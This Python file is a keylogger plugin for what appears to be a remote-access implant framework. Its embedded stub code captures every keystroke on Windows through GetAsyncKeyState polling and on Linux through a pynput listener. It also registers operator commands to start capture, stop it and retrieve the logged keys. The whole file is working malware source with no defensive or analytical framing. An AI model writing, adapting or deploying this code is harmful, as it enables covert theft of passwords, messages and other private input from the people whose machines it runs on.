PLUGIN = {"name": "keylogger", "desc": "Capture keystrokes (Windows native, Linux via pynput)", "deps": [], "size": 1.5}

STUB_CODE = r"""
_kl_keys = []; _kl_run = [False]
def _kl_thread():
    _kl_run[0] = True
    if platform.system() == "Windows":
        from ctypes import windll
        while _kl_run[0]:
            for c in range(255):
                if windll.user32.GetAsyncKeyState(c) & 1: _kl_keys.append(c)
            time.sleep(0.01)
    elif platform.system() == "Linux":
        try:
            from pynput import keyboard
            def _kp(k):
                try: _kl_keys.append(k.char)
                except: _kl_keys.append(f"[{k}]")
            with keyboard.Listener(on_press=_kp) as l: l.join()
        except: pass
    _kl_run[0] = False

def _cmd_keylog_start(m):
    if not _kl_run[0]: threading.Thread(target=_kl_thread, daemon=True).start(); return {"output": "[+] Keylogger started"}
    return {"output": "[!] Already running"}

def _cmd_keylog_stop(m):
    _kl_run[0] = False; return {"output": "[+] Keylogger stopped"}

def _cmd_keylog_get(m):
    o = "".join(str(c) if isinstance(c, int) else c for c in _kl_keys); _kl_keys.clear()
    return {"output": o or "(no keys captured)"}
_CMDS["keylog_start"] = _cmd_keylog_start; _CMDS["keylog_stop"] = _cmd_keylog_stop; _CMDS["keylog_get"] = _cmd_keylog_get
"""

def get_commands():
    return {"keylog_start": "_cmd_keylog_start", "keylog_stop": "_cmd_keylog_stop", "keylog_get": "_cmd_keylog_get"}
